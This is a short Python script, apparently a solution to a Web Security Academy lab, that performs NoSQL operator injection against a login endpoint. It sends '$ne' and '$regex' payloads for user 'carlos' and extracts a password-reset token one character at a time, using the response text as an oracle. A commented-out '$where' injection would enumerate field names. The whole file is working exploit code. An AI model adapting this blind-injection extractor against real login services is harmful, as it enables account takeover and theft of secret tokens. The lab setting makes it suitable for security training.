import requests
import string
import json


possible_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"
password = ["","","","","","","","","",""]

for j in range(0,10):
    for i in range(0,30):
        for c in possible_chars:
            print(password[j]+c, end="\r")
            data = {
                "username":"carlos",
                "password":{"$ne":"invalid"},
                "resetToken":{"$regex":f"^.{{{i}}}{c}.*"}
                #"$where":f"Object.keys(this)[{j}].match('^.{{{i}}}{c}.*')"
            }
            with open("file.log","a") as f:
                f.write(json.dumps(data)+"\n")
            #print(json.dumps(data))
            r = requests.post("https://0a4e00b0034ad90181c3c656002f003b.web-security-academy.net/login", json=data)
            if "locked" in r.text:
                password[j] += c
                break
        if "$" in password[j]:
            print("\n")
            break
